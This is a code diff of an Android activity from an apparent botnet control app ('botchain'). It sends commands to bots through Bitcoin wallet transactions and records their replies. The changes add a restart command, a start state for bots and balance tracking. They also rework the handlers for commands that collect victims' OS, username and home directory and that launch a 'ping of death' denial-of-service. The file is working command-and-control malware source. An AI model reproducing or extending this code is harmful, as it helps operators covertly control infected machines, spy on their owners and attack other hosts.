@@ -6,7 +6,6 @@ import android.content.Intent;
 import android.os.Bundle;
 import android.support.v7.app.AppCompatActivity;
 import android.util.Log;
-import android.view.LayoutInflater;
 import android.view.Menu;
 import android.view.MenuItem;
 import android.view.View;
@@ -14,21 +13,16 @@ import android.widget.AdapterView;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.ListView;
-import android.widget.TextView;
-import android.widget.Toast;
 
 import com.example.tonipagliaro.botchain.Adapter.BotListAdapter;
 
 import org.bitcoinj.core.Address;
 import org.bitcoinj.core.Coin;
 import org.bitcoinj.core.Transaction;
-import org.bitcoinj.core.TransactionOutput;
-import org.bitcoinj.script.Script;
 import org.bitcoinj.wallet.Wallet;
 import org.bitcoinj.wallet.listeners.WalletCoinsReceivedEventListener;
 
 import java.util.ArrayList;
-import java.util.List;
 
 public class BotListActivity extends AppCompatActivity {
 
@@ -39,7 +33,7 @@ public class BotListActivity extends AppCompatActivity {
     ArrayList<String> indirizzi=new ArrayList<String>();
 
     ListView listView;
-    Button buttonRefresh;
+    Button buttonRestart;
     Button buttonBroadcast;
     Button buttonWallet;
 
@@ -72,7 +66,8 @@ public class BotListActivity extends AppCompatActivity {
                                     Log.d("App", lw.getItemAtPosition(which).toString());
                                     final String botAddress = listView.getItemAtPosition(position).toString().split("-")[0];
                                     String command = lw.getItemAtPosition(which).toString();
-                                    if (appState.mappaIndirizzi.get(botAddress).equalsIgnoreCase(appState.BOT_STATE_ONLINE)) {
+                                    if (appState.mappaIndirizzi.get(botAddress).equalsIgnoreCase(appState.BOT_STATE_ONLINE) ||
+                                            appState.mappaIndirizzi.get(botAddress).equalsIgnoreCase(appState.BOT_STATE_START)) {
                                         switch (command) {
                                             case ("Get OS"):
                                                 appState.sendCommand("os-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString(),
@@ -138,13 +133,13 @@ public class BotListActivity extends AppCompatActivity {
             }
         });
 
-        buttonRefresh = (Button) this.findViewById(R.id.button_refresh);
-        buttonRefresh.setOnClickListener(new View.OnClickListener() {
+        buttonRestart = (Button) this.findViewById(R.id.button_refresh);
+        buttonRestart.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
                 //Inviamo il comando solo ai bot che hanno lo stato "ok"
                 try {
-                    appState.sendCommand("ping-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString());
+                    appState.sendCommand("restart-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString());
                 } catch (Exception e) {
                     e.printStackTrace();
                 }
@@ -249,41 +244,56 @@ public class BotListActivity extends AppCompatActivity {
 
                     Log.d("App", "address:" + addressString);
 
+                    String balance = "";
+
                     if (appState.hasMapAddress(addressString)) {
                         switch (comando) {
-                            case ("os"):
+                            case ("os_ok"):
                                 setBotStateOnline(addressString);
                                 String os = v[2];
+                                balance = v[3];
+                                appState.db.updateBalance(addressString, balance);
                                 appState.db.updateOs(addressString, os);
                                 //appState.writeQuestFile("SISTEMA OPERATIV BOT: " + os);
                                 Log.d("App", "SISTEMA OPERATIV BOT: " + os);
                                 break;
                             case ("ping_ok"):
                                 setBotStateOnline(addressString);
+                                balance = v[2];
+                                appState.db.updateBalance(addressString, balance);
                                 for (String s : appState.mappaIndirizzi.keySet()) {
                                     Log.d("App", "indirizzo " + s + " valore " + appState.mappaIndirizzi.get(s));
                                 }
                                 break;
-                            case ("username"):
+                            case ("username_ok"):
                                 setBotStateOnline(addressString);
                                 String username = v[2];
+                                balance = v[3];
+                                appState.db.updateBalance(addressString, balance);
                                 appState.db.updateUsername(addressString, username);
                                 //appState.writeQuestFile("SISTEMA OPERATIV BOT: " + username);
                                 Log.d("App", "SISTEMA OPERATIV BOT: " + username);
                                 break;
-                            case ("userhome"):
+                            case ("userhome_ok"):
                                 setBotStateOnline(addressString);
                                 String userhome = v[2];
+                                balance = v[3];
+                                appState.db.updateBalance(addressString, balance);
                                 appState.db.updateUserHome(addressString, userhome);
-                                //appState.writeQuestFile("SISTEMA OPERATIV BOT: " + userhome);
                                 Log.d("App", "USERHOME BOT: " + userhome);
                                 break;
-                            case ("pingOfDeath"):
+                            case ("pingOfDeath_ok"):
                                 setBotStateOnline(addressString);
                                 String pingOfDeath = v[2];
+                                balance = v[3];
+                                appState.db.updateBalance(addressString, balance);
                                 appState.db.updatePingOfDeath(addressString, pingOfDeath);
-                                //appState.writeQuestFile("SISTEMA OPERATIV BOT: " + userhome);
                                 Log.d("App", "PING OF DEATH BOT: " + pingOfDeath);
+                                break;
+                            case ("restart_ok"):
+                                setBotStateStart(addressString);
+                                balance = v[3];
+                                appState.db.updateBalance(addressString, balance);
                                 break;
                             default:
                                 break;
@@ -313,6 +323,21 @@ public class BotListActivity extends AppCompatActivity {
 
     public void setBotStateOnline(String address) {
         appState.mappaIndirizzi.put(address, appState.BOT_STATE_ONLINE);
+        appState.saveMappaIndirizzi();
+        indirizzi.clear();
+        for(String s : appState.mappaIndirizzi.keySet()){
+            indirizzi.add(s + "-" + appState.mappaIndirizzi.get(s));
+        }
+        runOnUiThread(new Runnable() {
+            @Override
+            public void run() {
+                listaBotAdapter.notifyDataSetChanged();
+            }
+        });
+    }
+
+    public void setBotStateStart(String address) {
+        appState.mappaIndirizzi.put(address, appState.BOT_STATE_START);
         appState.saveMappaIndirizzi();
         indirizzi.clear();
         for(String s : appState.mappaIndirizzi.keySet()){
